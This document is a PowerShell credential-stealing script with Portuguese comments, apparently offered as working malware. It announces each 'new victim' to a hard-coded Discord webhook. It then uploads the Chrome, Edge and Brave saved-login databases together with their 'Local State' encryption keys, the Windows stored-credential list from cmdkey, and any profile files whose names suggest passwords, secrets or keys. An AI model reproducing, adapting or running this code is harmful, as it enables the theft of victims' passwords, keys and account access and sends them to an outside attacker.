$webhookUrl = "https://discord.com/api/webhooks/1563550985274531890/nmcjdI8zDoYiEV9aoW7miLtlWHLRr7g1eujQtHya92oSWuVUuJdbgmosATTyYFSz4qAi"

function Send-ToWebhook {
    param (
        [string]$Message, 
        [string]$FilePath = $null
    )

    try {
        if ($FilePath) {
            # Envia como multipart/form-data para evitar o limite de 2000 caracteres (Erro 400)
            $form = @{
                content = $Message
                file = Get-Item -Path $FilePath
            }
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
        } else {
            # Envia como JSON simples para mensagens curtas
            $payload = @{ content = $Message } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        }
    } catch {
        Write-Host "Erro ao enviar para o Webhook: $($_.Exception.Message)"
    }
}

try {
    # 1. Coleta de Informações Básicas do Sistema
    $sysInfo = "--- Nova Vítima Detectada ---nUsuário: $(whoami) | PC: $env:COMPUTERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
    Send-ToWebhook -Message $sysInfo

    # 2. Extração de Navegadores (Chrome, Edge, Brave)
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    )

    foreach ($path in $paths) {
        if (Test-Path $path) {
            $browserName = Split-Path (Split-Path $path -Parent) -Leaf
            
            # Exfiltra o Local State (Chave de criptografia)
            $localStatePath = $path.Replace("Login Data", "Local State")
            if (Test-Path $localStatePath) {
                Send-ToWebhook -Message "Local State de $browserName" -FilePath $localStatePath
            }
            
            # Copia Login Data para arquivo temporário (evita erro de arquivo em uso) e envia
            $tempFile = "$env:TEMP\login_data_tmp"
            Copy-Item -Path $path -Destination $tempFile -Force
            Send-ToWebhook -Message "Login Data de $browserName" -FilePath $tempFile
            Remove-Item $tempFile
        }
    }

    # 3. Coleta de Senhas Salvas no Windows (Credenciais do Cofre)
    $creds = cmdkey /list | Out-String
    if ($creds) {
        Send-ToWebhook -Message "Credenciais do Windows (cmdkey):nn$creds"
    }

    # 4. Coleta de arquivos de configuração comuns (FTP, SSH, etc)
    $configFiles = Get-ChildItem -Path "$env:USERPROFILE" -Include *.txt, *.ini, *.config, *.env -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "pass|pwd|secret|key" }
    foreach ($file in $configFiles) {
        $content = Get-Content $file.FullName -Raw
        if ($content.Length -lt 2000) {
            Send-ToWebhook -Message "Arquivo Sensível: $($file.FullName)n`n$content"
        } else {
            Send-ToWebhook -Message "Arquivo Sensível (Grande): $($file.FullName)" -FilePath $file.FullName
        }
    }

} catch {
    Send-ToWebhook -Message "Erro crítico durante a execução: $($_.Exception.Message)"
}
